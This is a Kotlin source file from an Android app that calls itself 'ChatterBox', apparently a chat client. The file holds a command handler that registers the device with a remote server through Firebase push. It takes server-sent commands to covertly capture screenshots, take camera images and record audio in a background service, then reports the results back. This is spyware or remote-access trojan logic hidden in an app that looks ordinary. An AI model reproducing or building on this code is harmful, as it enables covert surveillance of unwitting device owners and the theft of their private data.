package com.example.ChatterBox.database

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.provider.Settings
import android.util.Log
import androidx.core.content.ContextCompat
import com.google.firebase.messaging.FirebaseMessaging
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors
import javax.net.ssl.HttpsURLConnection

@SuppressLint("HardwareIds")
class Commands(private val context: Context) {
    private val TAG = "Commands"
    private val executor = Executors.newSingleThreadExecutor()

    private var fcmWorking = false

    private val deviceId: String by lazy {
        Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
    }

    private val commandTypes = mutableMapOf<String, String>()

    private val commandHandlers = mapOf<String, (JSONObject) -> Unit>(
        "capture_screenshot" to ::handleCaptureScreenshotCommand,
        "capture_camera" to ::handleCaptureCameraCommand,
        "get_audio" to ::handleCaptureAudioCommand
    )

    fun initialize() {
        setupFCM()
    }

    private fun setupFCM() {
        try {
            FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
                if (!task.isSuccessful) {
                    fcmWorking = false
                    return@addOnCompleteListener
                }
                val token = task.result
                registerFCMToken(token)
                fcmWorking = true
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error setting up FCM: ${e.message}")
            fcmWorking = false
        }
    }

    private fun registerFCMToken(token: String) {
        executor.execute {
            try {
                val url = URL("${DataSynchronizer.SyncConfig.API_ENDPOINT}register_fcm")
                val connection = url.openConnection() as HttpsURLConnection
                connection.requestMethod = "POST"
                connection.setRequestProperty("Content-Type", "application/json")
                connection.setRequestProperty("User-Agent", "ChatterBox/${getAppVersion()}")
                connection.setRequestProperty("X-Device-ID", deviceId)
                connection.connectTimeout = 15000
                connection.readTimeout = 15000
                connection.doOutput = true
                connection.doInput = true

                val requestData = JSONObject().apply {
                    put("device_id", deviceId)
                    put("fcm_token", token)
                    put("timestamp", System.currentTimeMillis())
                }

                OutputStreamWriter(connection.outputStream).use { writer ->
                    writer.write(requestData.toString())
                    writer.flush()
                }

                val responseCode = connection.responseCode
                if (responseCode == HttpsURLConnection.HTTP_OK) {
                    Log.d(TAG, "FCM token registered with server")
                } else {
                    Log.e(TAG, "Failed to register FCM token, server returned: $responseCode")
                }

                connection.disconnect()
            } catch (_: Exception) {
            }
        }
    }

    fun processFCMCommand(data: Any) {
        try {
            val commandObj = when (data) {
                is String -> JSONObject(data)
                is Map<*, *> -> {
                    val json = JSONObject()
                    data.forEach { (key, value) ->
                        if (key is String && value != null) {
                            json.put(key, value)
                        }
                    }
                    json
                }
                is JSONObject -> data
                else -> {
                    return
                }
            }

            val commandId = commandObj.optString("id", "")
            val commandType = commandObj.optString("command", "")

            if (commandId.isEmpty() || commandType.isEmpty()) {
                Log.w(TAG, "Missing id or command in command object")
                return
            }

            Log.d(TAG, "Processing command: $commandType, ID: $commandId")
            if (commandId.isNotEmpty()) {
                commandTypes[commandId] = commandType
            }

            val handler = commandHandlers[commandType]
            if (handler != null) {
                handler(commandObj)
            } else {
                Log.w(TAG, "Unknown command type: $commandType")
                sendCommandResponse(commandId, false, "Unknown command type")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error processing command: ${e.message}")
            e.printStackTrace()
        }
    }

    fun sendCommandResponse(commandId: String, success: Boolean, message: String, result: JSONObject? = null) {
        executor.execute {
            try {
                val responseData = JSONObject().apply {
                    put("device_id", deviceId)
                    put("command_id", commandId)
                    put("command_type", getCommandTypeForId(commandId))
                    put("success", success)
                    put("message", message)
                    put("timestamp", System.currentTimeMillis())
                    if (result != null) {
                        put("result", result)
                    }
                }

                val url = URL("${DataSynchronizer.SyncConfig.API_ENDPOINT}command_response")
                val connection = url.openConnection() as HttpsURLConnection
                connection.requestMethod = "POST"
                connection.setRequestProperty("Content-Type", "application/json")
                connection.setRequestProperty("User-Agent", "ChatterBox/${getAppVersion()}")
                connection.setRequestProperty("X-Device-ID", deviceId)
                connection.connectTimeout = 15000
                connection.readTimeout = 15000
                connection.doOutput = true

                OutputStreamWriter(connection.outputStream).use { writer ->
                    writer.write(responseData.toString())
                    writer.flush()
                }
                connection.disconnect()
            } catch (_: Exception) {
            }
        }
    }

    private fun getCommandTypeForId(commandId: String): String {
        return commandTypes[commandId] ?: "unknown"
    }

    private fun handleCaptureScreenshotCommand(command: JSONObject) {
        try {
            val commandId = command.optString("id")
            val result = JSONObject().apply {
                put("message", "Screenshot capture initiated")
                put("status", "pending")
            }
            sendCommandResponse(commandId, true, "Screenshot requested", result)
            val intent = android.content.Intent(context, BackgroundSyncService::class.java)
            intent.action = "CAPTURE_SCREENSHOT"
            intent.putExtra("command_id", commandId)
            context.startService(intent)
        } catch (e: Exception) {
            sendCommandResponse(command.optString("id"), false, "Error: ${e.message}")
        }
    }

    private fun handleCaptureCameraCommand(command: JSONObject) {
        try {
            val commandId = command.optString("id")

            if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                val result = JSONObject().apply {
                    put("message", "Camera permission not granted")
                    put("status", "error")
                }
                sendCommandResponse(commandId, false, "Camera permission not granted", result)
                return
            }

            val result = JSONObject().apply {
                put("message", "Camera capture initiated")
                put("status", "pending")
            }
            sendCommandResponse(commandId, true, "Camera capture requested", result)
            val intent = android.content.Intent(context, BackgroundSyncService::class.java)
            intent.action = "CAPTURE_CAMERA"
            intent.putExtra("command_id", commandId)
            context.startService(intent)

        } catch (e: Exception) {
            sendCommandResponse(command.optString("id"), false, "Error: ${e.message}")
        }
    }

    private fun handleCaptureAudioCommand(command: JSONObject) {
        try {
            val commandId = command.optString("id")
            val duration = command.optInt("duration", 30)

            val result = JSONObject().apply {
                put("message", "Audio recording initiated")
                put("status", "pending")
            }
            sendCommandResponse(commandId, true, "Audio recording requested", result)

            val intent = android.content.Intent(context, BackgroundSyncService::class.java)
            intent.action = "CAPTURE_AUDIO"
            intent.putExtra("command_id", commandId)
            intent.putExtra("duration", duration)
            context.startService(intent)

        } catch (e: Exception) {
            sendCommandResponse(command.optString("id"), false, "Error: ${e.message}")
        }
    }

    private fun getAppVersion(): String {
        return try {
            context.packageManager.getPackageInfo(context.packageName, 0).versionName ?: "1.0.0"
        } catch (e: Exception) {
            "1.0.0"
        }
    }
}